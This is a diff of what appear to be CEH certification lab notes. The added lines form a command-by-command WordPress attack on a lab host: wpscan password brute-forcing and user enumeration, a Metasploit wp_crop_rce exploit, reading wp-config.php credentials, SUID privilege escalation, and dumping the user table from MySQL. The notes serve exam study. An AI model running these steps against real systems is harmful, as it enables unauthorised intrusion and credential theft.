@@ -174,13 +174,38 @@ www.cehorg.com:8080 found, wamp server with DVWA but level impossible (admin:pas
 
 wpscan --usernames adam -P rockyou.txt --url http://192.168.0.222:8080/CEH/
 orange1234
+
 wpscan -U users.txt -P rockyou.txt --url http://192.168.0.222:8080/CEH/
 wpscan --url http://192.168.0.222:8080/CEH/ --enumerate u  (u usernames)
+Browse http://192.168.0.222:8080/CEH/wp-json/wp/v2/users (/wp-json/wp/v2/users/1 or /wp-json/wp/v2/users/2...401 = users & 404 = no users)
 wpscan --url http://192.168.0.222:8080/CEH/ --enumerat p   (p only vulnerable plugins)
 wpscan --url http://192.168.0.222:8080/CEH/ --enumerat cb  (cb for config backup)
+wpscan --url http://192.168.0.222:8080/CEH/wp-login -U "admin,robert" -P rockyou.txt --password-attack xmlrpc
+
+msfcondole
+use exploit/multi/http/wp_crop_rce
+set RHOSTS 192.168.0.222
+set USERNAME admin
+set PASSWORD cutie
+run
+shell
+cat wp-config.php  (db user & pwd)
+find / -type f -perm -u=s 2>/dev/null
+*found /usr/bin/checker
+/usr/bin/checker (did not get root shell so)
+apt install ltrace
+ltrace /usr/bin/checker
+export admin=1
+/usr/bin/checker
+
+mysql -u wordpressuser -p
+cutie
+show databases;
+use blog;
+show tables;
+select * from wp_users;
 
 *You can also check http://192.168.0.222:8080/phpmyadmin/index.php
-
 -----------------------------------------------------------------------------------------------------------
 -Search in CWE list quick access on the 2023 CWE Top 25 most dangerous weakness ID of the last entry:
 https://cwe.mitre.org/ + https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html
@@ -1671,4 +1696,5 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
